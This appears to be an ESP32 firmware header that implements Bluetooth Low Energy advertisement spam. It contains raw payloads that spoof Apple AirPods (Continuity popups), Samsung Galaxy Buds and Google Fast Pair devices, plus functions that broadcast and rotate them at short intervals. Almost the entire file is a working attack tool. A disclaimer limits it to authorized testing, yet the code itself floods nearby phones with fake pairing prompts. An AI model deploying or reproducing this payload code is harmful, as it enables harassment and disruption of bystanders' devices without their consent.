/*
 * ─────────────────────────────────────────────────────────
 * GOATI : BLE spam (ESP32Marauder-style advertisement flooding)
 *
 * Uses the Arduino-ESP32 built-in BLE library so it can coexist
 * with the ESP32-BLE-Keyboard library (both share BLEDevice.h).
 *
 * Implements three spam modes:
 *   - APPLE  : Fake AirPods / Apple Continuity Protocol
 *   - SAMSUNG: Fake Galaxy Buds advertisement
 *   - FASTPAIR: Fake Google Fast Pair device
 *
 * INTENDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL
 * USE ONLY on devices you own or have explicit permission to
 * test.  Do not use in public spaces.
 *
 * Depends on: built-in `BLEDevice.h` (no NimBLE conflict).
 * ─────────────────────────────────────────────────────────
 */

#pragma once

#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>

// ─── Modes ──────────────────────────────────────────────────────────────
enum BleSpamMode : uint8_t {
  BLE_SPAM_OFF      = 0,
  BLE_SPAM_APPLE    = 1,
  BLE_SPAM_SAMSUNG  = 2,
  BLE_SPAM_FASTPAIR = 3,
  BLE_SPAM__COUNT
};

static const char* const BLE_SPAM_NAMES[] = {
  "OFF",
  "APPLE",
  "SAMSUNG",
  "FASTPAIR"
};

// ─── State ───────────────────────────────────────────────────────────────
static BleSpamMode g_ble_spam_mode = BLE_SPAM_OFF;
static uint32_t    g_ble_spam_pkt_count = 0;
static uint32_t    g_ble_spam_start_ms  = 0;
static bool        g_ble_spam_running   = false;
static bool        g_ble_spam_inited    = false;

// ─── Raw AD payloads (sourced from ESP32Marauder project) ───────────────
// Apple Continuity Protocol — triggers iOS pairing popup
static const uint8_t BLE_ADV_APPLE_FMT[] = {
  0x02, 0x01, 0x06,
  0x1A, 0xFF, 0x4C, 0x00,
  0x07, 0x19, 0x07,
  0x0F, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12,
  0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00
};

// Samsung Galaxy Buds-like
static const uint8_t BLE_ADV_SAMSUNG_FMT[] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0xFE, 0x2C,
  0x17, 0xFF, 0x75, 0x00,
  0x42, 0x09, 0x81, 0x02, 0x14, 0x4D, 0x06, 0x59, 0x91, 0x23,
  0x82, 0x04, 0x09, 0xC0, 0x91, 0x55, 0x14, 0x09, 0xE4, 0x07,
  0x04, 0xC0
};

// Google Fast Pair service data
static const uint8_t BLE_ADV_FASTPAIR_FMT[] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0x2C, 0xFE,
  0x06, 0x16, 0x2C, 0xFE,
  0x04, 0x00, 0x00
};

// ─── Public API ──────────────────────────────────────────────────────────
static void ble_spam_stop(); // forward decl

static void ble_spam_init() {
  if (g_ble_spam_inited) return;
  BLEDevice::init("GOATI");
  // Don't consume a full BLE server — use advertising only
  g_ble_spam_inited = true;
  Serial.println(F("[BLE Spam] init OK (Arduino BLE)"));
}

static void ble_spam_apply_payload(BleSpamMode mode) {
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  if (!pAdv) return;
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  switch (mode) {
    case BLE_SPAM_APPLE:
      oAdvertisementData.addData(std::string((const char*)BLE_ADV_APPLE_FMT,
                                             sizeof(BLE_ADV_APPLE_FMT)));
      break;
    case BLE_SPAM_SAMSUNG:
      oAdvertisementData.addData(std::string((const char*)BLE_ADV_SAMSUNG_FMT,
                                             sizeof(BLE_ADV_SAMSUNG_FMT)));
      break;
    case BLE_SPAM_FASTPAIR:
      oAdvertisementData.addData(std::string((const char*)BLE_ADV_FASTPAIR_FMT,
                                             sizeof(BLE_ADV_FASTPAIR_FMT)));
      break;
    default: break;
  }
  pAdv->setAdvertisementData(oAdvertisementData);
}

static void ble_spam_start(BleSpamMode mode) {
  if (mode == BLE_SPAM_OFF) { ble_spam_stop(); return; }
  Serial.printf("[BLE Spam] starting mode=%s\r\n", BLE_SPAM_NAMES[mode]);
  g_ble_spam_mode      = mode;
  g_ble_spam_pkt_count = 0;
  g_ble_spam_start_ms  = millis();
  g_ble_spam_running   = true;

  ble_spam_init();
  ble_spam_apply_payload(mode);
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  pAdv->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  pAdv->setMinInterval(0x20);
  pAdv->setMaxInterval(0x40);
  pAdv->setScanResponse(false);
  pAdv->start();
}

static void ble_spam_stop() {
  if (!g_ble_spam_running) return;
  Serial.println(F("[BLE Spam] stopped"));
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  if (pAdv) pAdv->stop();
  g_ble_spam_running = false;
  g_ble_spam_mode    = BLE_SPAM_OFF;
}

static void ble_spam_loop() {
  if (!g_ble_spam_running) return;
  g_ble_spam_pkt_count++;
  // Rotate advertisement every ~1 s to vary appearance
  static uint32_t s_last_rot = 0;
  if (millis() - s_last_rot > 1000) {
    s_last_rot = millis();
    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    if (pAdv) {
      pAdv->stop();
      pAdv->start();
    }
  }
}

static void ble_spam_cycle_mode() {
  uint8_t m = (uint8_t)g_ble_spam_mode;
  m = (m + 1) % BLE_SPAM__COUNT;
  if (m == BLE_SPAM_OFF) m = BLE_SPAM_APPLE;
  if (g_ble_spam_running) ble_spam_start((BleSpamMode)m);
  else                     g_ble_spam_mode = (BleSpamMode)m;
  Serial.printf("[BLE Spam] mode cycled -> %s\r\n", BLE_SPAM_NAMES[m]);
}
